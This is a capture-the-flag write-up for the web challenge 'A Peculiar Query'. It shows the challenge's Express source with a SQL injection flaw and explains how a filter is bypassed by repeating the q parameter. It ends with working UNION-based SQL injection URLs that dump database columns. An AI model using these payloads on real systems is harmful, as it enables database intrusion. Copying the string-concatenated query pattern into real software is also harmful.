# **A Peculiar Query (180pts) (73 Solves)**

![TASK](https://imgur.com/A6EHPkW.png)

I really liked this web task , we are given this web page that have a search functionality 

![TASK](https://imgur.com/gRutDcV.png)

And we can read the source code 

```javascript

const express = require("express");
const rateLimit = require("express-rate-limit");
const app = express();
const { Pool, Client } = require("pg");
const port = process.env.PORT || 9090;
const path = require("path");

const client = new Client({
	user: process.env.DBUSER,
	host: process.env.DBHOST,
	database: process.env.DBNAME,
	password: process.env.DBPASS,
	port: process.env.DBPORT
});

async function query(q) {
	const ret = await client.query(`SELECT name FROM Criminals WHERE name ILIKE '${q}%';`);
	return ret;
}

app.set("view engine", "ejs");

app.use(express.static("public"));

app.get("/src", (req, res) => {
	res.sendFile(path.join(__dirname, "index.js"));
});

app.get("/", async (req, res) => {
	if (req.query.q) {
		try {
			let q = req.query.q;
			// no more table dropping for you
			let censored = false;
			for (let i = 0; i < q.length; i ++) {
				if (censored || "'-\".".split``.some(v => v == q[i])) {
					censored = true;
					q = q.slice(0, i) + "*" + q.slice(i + 1, q.length);
				}
			}
			q = q.substring(0, 80);
			const result = await query(q);
			res.render("home", {results: result.rows, err: ""});
		} catch (err) {
			console.log(err);
			res.status(500);
			res.render("home", {results: [], err: "aight wtf stop breaking things"});
		}
	} else {
		res.render("home", {results: [], err: ""});
	}
});

app.listen(port, function() {
	client.connect();
	console.log("App listening on port " + port);
});

```

## Overview ##

It's pretty obvious that we have an sql injection here ( we are concatenating the user input )
> 	const ret = await client.query(`SELECT name FROM Criminals WHERE name ILIKE '${q}%';`);

But as we can see some filters are here :'( these characters are filtered : [',-,",.] , after some tries i have figured that it will impossible to bypass 
them so i started looking to some JS tricks.
As we can see the filter function is looping over our input and checks if there are some prohibited characters and then it will replace 
them with "*" , For example if we type 
> hello"or 1=1 -- -

Our input will be changed to :
> hello************

```javascript
let q = req.query.q;
let censored = false;
for (let i = 0; i < q.length; i ++) {
	if (censored || "'-\".".split``.some(v => v == q[i])) {
			censored = true;
			q = q.slice(0, i) + "*" + q.slice(i + 1, q.length);
			}
}
```			

And finally it's using substring function to limit our input's length to 80 characters

```javascript
q = q.substring(0, 80);
const result = await query(q);
res.render("home", {results: result.rows, err: ""});
```
Hmmm everything seems okay nah ? but it's a ctf web task we have to find some vulnerabilities ! let's pass to how i did to solve it now, enough boring things

## Exploitation ##

The first thing i thinked about was http parameter pollution in express (read about it **[HERE](https://github.com/expressjs/express/issues/1824)** if you want ) ,briefly when we enter a get parameter multiple times express 
has a weird interpretation , it will process this parameter as an array for example here, if we pass this in the query :
> ?q=hello&q=allo&q=fword

**req.query.q** will be parsed as an array **["hello","allo","fword"]** , so if we go further when we will be iterating of **q** variable we will be comparing each array field with the filters 
for example, if we pass this query :
>q="or 1=1 -- -&q=fword

we will firstly compare **"or 1=1 -- -** and then the second field **fword** with these filtered chars **[',-,",.]** , they are not equal ! , Youupi we can get our flag now as we passed the check .

Unfortunately , it's not that easy ,have you forgot the substring function ? an array has not a built in substring function so when we reach the substring part this will raise an error so we won't execute the sql query :/
Javascript weird behaviour will save us this time ! if we do **[]+[]** the result is a string , the sum of two arrays is a string so if we enter a **"** in one query parameter
we will enter this part 

```javascript
censored = true;
q = q.slice(0, i) + "*" + q.slice(i + 1, q.length);
```
and arrays have a built in slice function so the result of **[]+"*"+[]** will be a string , we can now enter our payload with **q='** in the end to ensure that our array will be a string when it reaches the substring part
For example :
>q='or 1=1 -- -&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q='

will let us pass !

**FILTERS BYPASSED SUCCESSFULLY**

To test the number of q parameters and debug the app , i changed a little bit the source code and hosted the web app locally , you can find the modified source code **[HERE](https://github.com/kahla-sec/CTF-Writeups/blob/master/%C3%A5ngstromCTF2k20/A%20Peculiar%20Query/app.js)** if you want to test :D

![TASK](https://imgur.com/upRUoxR.png)


The next part is pretty classic , a simple sql injection , we will first dump the columns name (we know the table name from the source code)
> q=%27union%20SELECT%20column_name%20FROM%20information_schema.columns%20--%20-&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=%27

![TASK](https://imgur.com/XAVrsrR.png)


and finally we find a column named **crime** so our final payload will be :
>HOST/?q=%27union%20SELECT%20crime%20FROM%20criminals%20--%20-&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=a&q=%27

![TASK](https://imgur.com/7KWe6dF.png)

And Congratulations ! I want to thank the organizers for this great CTF and fun tasks , i have really enjoyed participating

